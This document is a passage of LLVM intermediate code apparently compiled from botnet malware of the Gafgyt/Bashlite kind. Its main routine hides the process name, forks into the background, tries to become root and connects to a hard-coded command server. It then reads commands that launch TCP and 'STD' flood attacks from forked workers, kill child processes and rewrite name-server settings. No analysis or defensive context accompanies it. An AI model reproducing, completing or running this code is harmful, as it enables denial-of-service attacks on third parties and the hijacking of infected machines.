  %226 = icmp eq i32 %0, 7
  br i1 %226, label %227, label %232

; <label>:227:                                    ; preds = %225
  %228 = getelementptr inbounds i8*, i8** %1, i64 6
  %229 = load i8*, i8** %228, align 8
  %230 = tail call i32 @atoi(i8* %229) #14
  %231 = icmp slt i32 %230, 1
  br i1 %231, label %321, label %232

; <label>:232:                                    ; preds = %227, %225
  %233 = getelementptr inbounds i8*, i8** %1, i64 1
  %234 = load i8*, i8** %233, align 8
  %235 = load i8*, i8** %216, align 8
  %236 = tail call i32 @atoi(i8* %235) #14
  %237 = load i8*, i8** %211, align 8
  %238 = tail call i32 @atoi(i8* %237) #14
  %239 = getelementptr inbounds i8*, i8** %1, i64 4
  %240 = load i8*, i8** %239, align 8
  br i1 %226, label %241, label %245

; <label>:241:                                    ; preds = %232
  %242 = getelementptr inbounds i8*, i8** %1, i64 6
  %243 = load i8*, i8** %242, align 8
  %244 = tail call i32 @atoi(i8* %243) #14
  br label %245

; <label>:245:                                    ; preds = %232, %241
  %246 = phi i32 [ %244, %241 ], [ 10, %232 ]
  %247 = getelementptr inbounds i8*, i8** %1, i64 5
  %248 = load i8*, i8** %247, align 8
  %249 = tail call i32 @atoi(i8* %248) #14
  %strchr133 = tail call i8* @strchr(i8* %234, i32 44)
  %250 = icmp eq i8* %strchr133, null
  br i1 %250, label %257, label %.preheader139.preheader

.preheader139.preheader:                          ; preds = %245
  br label %.preheader139

.preheader139:                                    ; preds = %.preheader139.preheader, %253
  %.sink135 = phi i8* [ null, %253 ], [ %234, %.preheader139.preheader ]
  %251 = tail call i8* @strtok(i8* %.sink135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i64 0, i64 0)) #7
  %252 = icmp eq i8* %251, null
  br i1 %252, label %.loopexit140.loopexit, label %253

; <label>:253:                                    ; preds = %.preheader139
  %254 = tail call i32 @listFork()
  %255 = icmp eq i32 %254, 0
  br i1 %255, label %256, label %.preheader139

; <label>:256:                                    ; preds = %253
  tail call void @SendTCP(i8* nonnull %251, i32 %236, i32 %238, i8* %240, i32 %249, i32 %246, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:257:                                    ; preds = %245
  %258 = tail call i32 @listFork()
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %321

; <label>:260:                                    ; preds = %257
  tail call void @SendTCP(i8* %234, i32 %236, i32 %238, i8* %240, i32 %249, i32 %246, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit140.loopexit:                            ; preds = %.preheader139
  br label %.loopexit140

.loopexit140:                                     ; preds = %.loopexit140.loopexit, %.loopexit142
  %261 = load i8*, i8** %1, align 8
  %262 = tail call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.558, i64 0, i64 0)) #14
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %.loopexit138

; <label>:264:                                    ; preds = %.loopexit140
  %265 = icmp slt i32 %0, 4
  br i1 %265, label %321, label %266

; <label>:266:                                    ; preds = %264
  %267 = getelementptr inbounds i8*, i8** %1, i64 2
  %268 = load i8*, i8** %267, align 8
  %269 = tail call i32 @atoi(i8* %268) #14
  %270 = icmp slt i32 %269, 1
  br i1 %270, label %321, label %271

; <label>:271:                                    ; preds = %266
  %272 = getelementptr inbounds i8*, i8** %1, i64 3
  %273 = load i8*, i8** %272, align 8
  %274 = tail call i32 @atoi(i8* %273) #14
  %275 = icmp slt i32 %274, 1
  br i1 %275, label %321, label %276

; <label>:276:                                    ; preds = %271
  %277 = getelementptr inbounds i8*, i8** %1, i64 1
  %278 = load i8*, i8** %277, align 8
  %strchr134 = tail call i8* @strchr(i8* %278, i32 44)
  %279 = icmp eq i8* %strchr134, null
  br i1 %279, label %286, label %.preheader137.preheader

.preheader137.preheader:                          ; preds = %276
  br label %.preheader137

.preheader137:                                    ; preds = %.preheader137.preheader, %282
  %.sink136 = phi i8* [ null, %282 ], [ %278, %.preheader137.preheader ]
  %280 = tail call i8* @strtok(i8* %.sink136, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i64 0, i64 0)) #7
  %281 = icmp eq i8* %280, null
  br i1 %281, label %.loopexit138.loopexit, label %282

; <label>:282:                                    ; preds = %.preheader137
  %283 = tail call i32 @listFork()
  %284 = icmp eq i32 %283, 0
  br i1 %284, label %285, label %.preheader137

; <label>:285:                                    ; preds = %282
  tail call void @SendSTD(i8* nonnull %280, i32 %269, i32 %274)
  unreachable

; <label>:286:                                    ; preds = %276
  %287 = tail call i32 @listFork()
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %289, label %321

; <label>:289:                                    ; preds = %286
  tail call void @SendSTD(i8* %278, i32 %269, i32 %274)
  unreachable

.loopexit138.loopexit:                            ; preds = %.preheader137
  br label %.loopexit138

.loopexit138:                                     ; preds = %.loopexit138.loopexit, %.loopexit140
  %290 = load i8*, i8** %1, align 8
  %291 = tail call i32 @strcmp(i8* %290, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.559, i64 0, i64 0)) #14
  %292 = icmp eq i32 %291, 0
  %293 = load i64, i64* @numpids, align 8
  %294 = icmp ne i64 %293, 0
  %or.cond149 = and i1 %292, %294
  br i1 %or.cond149, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit138
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %307
  %.0147 = phi i64 [ %308, %307 ], [ 0, %.lr.ph.preheader ]
  %295 = load i32*, i32** @pids, align 8
  %296 = getelementptr inbounds i32, i32* %295, i64 %.0147
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %297, 0
  br i1 %298, label %307, label %299

; <label>:299:                                    ; preds = %.lr.ph
  %300 = tail call i32 @getpid() #7
  %301 = icmp eq i32 %297, %300
  br i1 %301, label %307, label %302

; <label>:302:                                    ; preds = %299
  %303 = load i32*, i32** @pids, align 8
  %304 = getelementptr inbounds i32, i32* %303, i64 %.0147
  %305 = load i32, i32* %304, align 4
  %306 = tail call i32 @kill(i32 %305, i32 9) #7
  br label %307

; <label>:307:                                    ; preds = %299, %.lr.ph, %302
  %308 = add i64 %.0147, 1
  %309 = load i64, i64* @numpids, align 8
  %310 = icmp ult i64 %308, %309
  br i1 %310, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %307
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit138
  %311 = load i8*, i8** %1, align 8
  %312 = tail call i32 @strcmp(i8* %311, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.560, i64 0, i64 0)) #14
  %313 = icmp eq i32 %312, 0
  br i1 %313, label %314, label %315

; <label>:314:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #16
  unreachable

; <label>:315:                                    ; preds = %.loopexit
  %316 = tail call i32 @strcmp(i8* %311, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.561, i64 0, i64 0)) #14
  %317 = icmp eq i32 %316, 0
  br i1 %317, label %318, label %321

; <label>:318:                                    ; preds = %315
  tail call void @RemoveTempDirs()
  %319 = load i32, i32* @mainCommSock, align 4
  %320 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %319, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.562, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.566 to i32))
  br label %321

; <label>:321:                                    ; preds = %315, %286, %257, %201, %133, %107, %51, %2, %264, %266, %271, %208, %210, %215, %220, %227, %154, %156, %161, %166, %174, %121, %123, %128, %98, %42, %318, %77, %21
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @getEndianness() local_unnamed_addr #0 {
  ret i32 ptrtoint ([14 x i8]* @.str.566 to i32)
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #2 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() local_unnamed_addr #2 {
  %1 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i64 0, i64 0), i32 513) #7
  %2 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i64 0, i64 0), i32 0) #7
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %8, label %4

; <label>:4:                                      ; preds = %0
  %5 = and i32 %1, 65535
  %6 = tail call i64 @write(i32 %5, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.564, i64 0, i64 0), i64 38) #7
  %7 = tail call i32 @close(i32 %5) #7
  br label %8

; <label>:8:                                      ; preds = %0, %4
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #2 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = load i8*, i8** %1, align 8
  %7 = tail call i64 @strlen(i8* %6) #14
  tail call void @llvm.memset.p0i8.i64(i8* %6, i8 0, i64 %7, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i64 0, i64 0), i8** %1, align 8
  %8 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.570 to i64), i32 0, i32 0, i32 0) #7
  %9 = tail call i64 @time(i64* null) #7
  %10 = tail call i32 @getpid() #7
  %11 = zext i32 %10 to i64
  %12 = xor i64 %11, %9
  %13 = trunc i64 %12 to i32
  tail call void @srand(i32 %13) #7
  %14 = tail call i64 @time(i64* null) #7
  %15 = tail call i32 @getpid() #7
  %16 = zext i32 %15 to i64
  %17 = xor i64 %16, %14
  %18 = trunc i64 %17 to i32
  tail call void @init_rand(i32 %18)
  %19 = tail call i32 @fork() #7
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %2
  %22 = call i32 @waitpid(i32 %19, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #16
  unreachable

; <label>:23:                                     ; preds = %2
  %24 = tail call i32 @fork() #7
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %27, label %26

; <label>:26:                                     ; preds = %23
  tail call void @exit(i32 0) #16
  unreachable

; <label>:27:                                     ; preds = %23
  %28 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.571, i64 0, i64 0)) #7
  %29 = tail call i32 @setuid(i32 0) #7
  %30 = tail call i32 @seteuid(i32 0) #7
  %31 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %32 = tail call i32 @fork() #7
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %.lr.ph107.preheader, label %.loopexit78

.lr.ph107.preheader:                              ; preds = %27
  br label %.lr.ph107

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %36
  %34 = tail call i32 @initConnection()
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %40, label %36

; <label>:36:                                     ; preds = %.lr.ph107
  %37 = tail call i32 @sleep(i32 5) #7
  %38 = tail call i32 @fork() #7
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %.lr.ph107, label %.loopexit78.loopexit128

; <label>:40:                                     ; preds = %.lr.ph107
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %41, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.572, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 ptrtoint ([14 x i8]* @.str.566 to i32))
  tail call void @UpdateNameSrvs()
  tail call void @RemoveTempDirs()
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %45 = call i32 @recvLine(i32 %43, i8* nonnull %44, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %.loopexit78, label %.preheader77.lr.ph

.preheader77.lr.ph:                               ; preds = %40
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %48 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.preheader77

.preheader77:                                     ; preds = %.preheader77.lr.ph, %.backedge
  %49 = phi i32 [ %45, %.preheader77.lr.ph ], [ %101, %.backedge ]
  %50 = load i64, i64* @numpids, align 8
  %51 = icmp eq i64 %50, 0
  br i1 %51, label %._crit_edge93, label %.lr.ph92.preheader

.lr.ph92.preheader:                               ; preds = %.preheader77
  br label %.lr.ph92

.lr.ph92:                                         ; preds = %.lr.ph92.preheader, %94
  %indvars.iv = phi i64 [ %indvars.iv.next, %94 ], [ 0, %.lr.ph92.preheader ]
  %52 = load i32*, i32** @pids, align 8
  %53 = getelementptr inbounds i32, i32* %52, i64 %indvars.iv
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @waitpid(i32 %54, i32* null, i32 1) #7
  %56 = icmp sgt i32 %55, 0
  br i1 %56, label %.preheader, label %94

.preheader:                                       ; preds = %.lr.ph92
  %57 = add nuw i64 %indvars.iv, 1
  %58 = load i64, i64* @numpids, align 8
  %59 = icmp ult i64 %57, %58
  %60 = load i32*, i32** @pids, align 8
  %61 = trunc i64 %indvars.iv to i32
  br i1 %59, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %62 = trunc i64 %57 to i32
  %63 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %64 = phi i32* [ %73, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %65 = phi i64 [ %70, %.lr.ph ], [ %57, %.lr.ph.preheader ]
  %.06584 = phi i32 [ %.065, %.lr.ph ], [ %62, %.lr.ph.preheader ]
  %.065.in83 = phi i32 [ %.06584, %.lr.ph ], [ %63, %.lr.ph.preheader ]
  %66 = getelementptr inbounds i32, i32* %64, i64 %65
  %67 = load i32, i32* %66, align 4
  %68 = zext i32 %.065.in83 to i64
  %69 = getelementptr inbounds i32, i32* %64, i64 %68
  store i32 %67, i32* %69, align 4
  %.065 = add i32 %.06584, 1
  %70 = zext i32 %.065 to i64
  %71 = load i64, i64* @numpids, align 8
  %72 = icmp ult i64 %70, %71
  %73 = load i32*, i32** @pids, align 8
  br i1 %72, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.065.in.lcssa = phi i32 [ %61, %.preheader ], [ %.06584, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %60, %.preheader ], [ %73, %._crit_edge.loopexit ]
  %74 = zext i32 %.065.in.lcssa to i64
  %75 = getelementptr inbounds i32, i32* %.lcssa, i64 %74
  store i32 0, i32* %75, align 4
  %76 = load i64, i64* @numpids, align 8
  %77 = add i64 %76, -1
  store i64 %77, i64* @numpids, align 8
  %78 = shl i64 %76, 2
  %79 = call noalias i8* @malloc(i64 %78) #7
  %80 = bitcast i8* %79 to i32*
  %81 = icmp eq i64 %77, 0
  %82 = load i32*, i32** @pids, align 8
  br i1 %81, label %._crit_edge89, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %.lr.ph88
  %83 = phi i32* [ %92, %.lr.ph88 ], [ %82, %.lr.ph88.preheader ]
  %84 = phi i64 [ %89, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %.16686 = phi i32 [ %88, %.lr.ph88 ], [ 0, %.lr.ph88.preheader ]
  %85 = getelementptr inbounds i32, i32* %83, i64 %84
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i32, i32* %80, i64 %84
  store i32 %86, i32* %87, align 4
  %88 = add i32 %.16686, 1
  %89 = zext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  %92 = load i32*, i32** @pids, align 8
  br i1 %91, label %.lr.ph88, label %._crit_edge89.loopexit

._crit_edge89.loopexit:                           ; preds = %.lr.ph88
  br label %._crit_edge89

._crit_edge89:                                    ; preds = %._crit_edge89.loopexit, %._crit_edge
  %.lcssa80 = phi i32* [ %82, %._crit_edge ], [ %92, %._crit_edge89.loopexit ]
  %93 = bitcast i32* %.lcssa80 to i8*
  call void @free(i8* %93) #7
  store i8* %79, i8** bitcast (i32** @pids to i8**), align 8
  br label %94

; <label>:94:                                     ; preds = %.lr.ph92, %._crit_edge89
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %95 = ashr exact i64 %sext, 32
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  br i1 %97, label %.lr.ph92, label %._crit_edge93.loopexit

._crit_edge93.loopexit:                           ; preds = %94
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %._crit_edge93.loopexit, %.preheader77
  %98 = sext i32 %49 to i64
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %98
  store i8 0, i8* %99, align 1
  call void @trim(i8* nonnull %44)
  %strncmp = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %.backedge, label %103

.backedge.loopexit:                               ; preds = %.lr.ph105
  br label %.backedge

.backedge.loopexit127:                            ; preds = %.preheader108
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit127, %.backedge.loopexit, %._crit_edge102.thread, %._crit_edge93, %._crit_edge102, %105
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = call i32 @recvLine(i32 %100, i8* nonnull %44, i32 4096)
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %.loopexit78.loopexit, label %.preheader77

; <label>:103:                                    ; preds = %._crit_edge93
  %strncmp69 = call i32 @strncmp(i8* nonnull %44, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.573, i64 0, i64 0), i64 3)
  %cmp70 = icmp eq i32 %strncmp69, 0
  br i1 %cmp70, label %104, label %105

; <label>:104:                                    ; preds = %103
  call void @exit(i32 0) #16
  unreachable

; <label>:105:                                    ; preds = %103
  %106 = load i8, i8* %44, align 16
  %107 = icmp eq i8 %106, 33
  br i1 %107, label %.preheader108.preheader, label %.backedge

.preheader108.preheader:                          ; preds = %105
  br label %.preheader108

.preheader108:                                    ; preds = %.preheader108.preheader, %109
  %.063 = phi i8* [ %110, %109 ], [ %47, %.preheader108.preheader ]
  %108 = load i8, i8* %.063, align 1
  switch i8 %108, label %109 [
    i8 0, label %.backedge.loopexit127
    i8 32, label %111
  ]

; <label>:109:                                    ; preds = %.preheader108
  %110 = getelementptr inbounds i8, i8* %.063, i64 1
  br label %.preheader108

; <label>:111:                                    ; preds = %.preheader108
  store i8 0, i8* %.063, align 1
  %112 = call i64 @strlen(i8* %47) #14
  %113 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %112
  %114 = getelementptr inbounds i8, i8* %113, i64 2
  br label %115

; <label>:115:                                    ; preds = %120, %111
  %116 = call i64 @strlen(i8* %114) #14
  %117 = add i64 %116, -1
  %118 = getelementptr inbounds i8, i8* %114, i64 %117
  %119 = load i8, i8* %118, align 1
  switch i8 %119, label %.preheader75.preheader [
    i8 13, label %120
    i8 10, label %120
  ]

.preheader75.preheader:                           ; preds = %115
  br label %.preheader75

; <label>:120:                                    ; preds = %115, %115
  store i8 0, i8* %118, align 1
  br label %115

.preheader75:                                     ; preds = %.preheader75.preheader, %122
  %.064 = phi i8* [ %123, %122 ], [ %114, %.preheader75.preheader ]
  %121 = load i8, i8* %.064, align 1
  switch i8 %121, label %122 [
    i8 32, label %124
    i8 0, label %124
  ]

; <label>:122:                                    ; preds = %.preheader75
  %123 = getelementptr inbounds i8, i8* %.064, i64 1
  br label %.preheader75

; <label>:124:                                    ; preds = %.preheader75, %.preheader75
  store i8 0, i8* %.064, align 1
  %125 = getelementptr inbounds i8, i8* %.064, i64 1
  %126 = load i8, i8* %114, align 1
  %127 = icmp eq i8 %126, 0
  br i1 %127, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %124
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %128 = phi i8 [ %133, %.lr.ph96 ], [ %126, %.lr.ph96.preheader ]
  %.06294 = phi i8* [ %132, %.lr.ph96 ], [ %114, %.lr.ph96.preheader ]
  %129 = zext i8 %128 to i32
  %130 = call i32 @toupper(i32 %129) #14
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %.06294, align 1
  %132 = getelementptr inbounds i8, i8* %.06294, i64 1
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %._crit_edge97.loopexit, label %.lr.ph96

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %124
  %135 = call i8* @strtok(i8* %125, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i64 0, i64 0)) #7
  store i8* %114, i8** %48, align 16
  %136 = icmp eq i8* %135, null
  br i1 %136, label %._crit_edge102.thread, label %.lr.ph101.preheader

.lr.ph101.preheader:                              ; preds = %._crit_edge97
  br label %.lr.ph101

._crit_edge102.thread:                            ; preds = %._crit_edge97
  call void @processCmd(i32 1, i8** nonnull %48)
  br label %.backedge

.lr.ph101:                                        ; preds = %.lr.ph101.preheader, %149
  %.06099 = phi i8* [ %150, %149 ], [ %135, %.lr.ph101.preheader ]
  %.06198 = phi i32 [ %.1, %149 ], [ 1, %.lr.ph101.preheader ]
  %137 = load i8, i8* %.06099, align 1
  %138 = icmp eq i8 %137, 10
  br i1 %138, label %149, label %139

; <label>:139:                                    ; preds = %.lr.ph101
  %140 = call i64 @strlen(i8* nonnull %.06099) #14
  %141 = add i64 %140, 1
  %142 = call noalias i8* @malloc(i64 %141) #7
  %143 = sext i32 %.06198 to i64
  %144 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %143
  store i8* %142, i8** %144, align 8
  %145 = call i64 @strlen(i8* nonnull %.06099) #14
  %146 = add i64 %145, 1
  call void @llvm.memset.p0i8.i64(i8* %142, i8 0, i64 %146, i32 1, i1 false)
  %147 = call i8* @strcpy(i8* %142, i8* nonnull %.06099) #7
  %148 = add nsw i32 %.06198, 1
  br label %149

; <label>:149:                                    ; preds = %.lr.ph101, %139
  %.1 = phi i32 [ %148, %139 ], [ %.06198, %.lr.ph101 ]
  %150 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i64 0, i64 0)) #7
  %151 = icmp eq i8* %150, null
  br i1 %151, label %._crit_edge102, label %.lr.ph101

._crit_edge102:                                   ; preds = %149
  call void @processCmd(i32 %.1, i8** nonnull %48)
  %152 = icmp sgt i32 %.1, 1
  br i1 %152, label %.lr.ph105.preheader, label %.backedge

.lr.ph105.preheader:                              ; preds = %._crit_edge102
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %.lr.ph105
  %indvars.iv115 = phi i64 [ %indvars.iv.next116, %.lr.ph105 ], [ 1, %.lr.ph105.preheader ]
  %153 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv115
  %154 = load i8*, i8** %153, align 8
  call void @free(i8* %154) #7
  %indvars.iv.next116 = add nuw nsw i64 %indvars.iv115, 1
  %exitcond = icmp eq i64 %indvars.iv.next116, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph105

.loopexit78.loopexit:                             ; preds = %.backedge
  br label %.loopexit78

.loopexit78.loopexit128:                          ; preds = %36
  br label %.loopexit78

.loopexit78:                                      ; preds = %.loopexit78.loopexit128, %.loopexit78.loopexit, %27, %40
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #3

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @seteuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
